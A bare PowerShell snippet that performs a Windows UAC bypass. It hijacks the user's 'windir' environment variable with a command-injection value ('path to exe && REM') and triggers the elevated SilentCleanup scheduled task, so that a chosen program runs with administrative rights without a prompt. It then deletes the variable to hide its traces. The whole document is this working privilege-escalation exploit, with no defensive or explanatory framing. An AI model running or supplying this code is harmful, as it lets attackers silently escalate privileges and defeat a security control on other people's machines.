$program = "path to exe && REM"
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
Start-Sleep 3
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
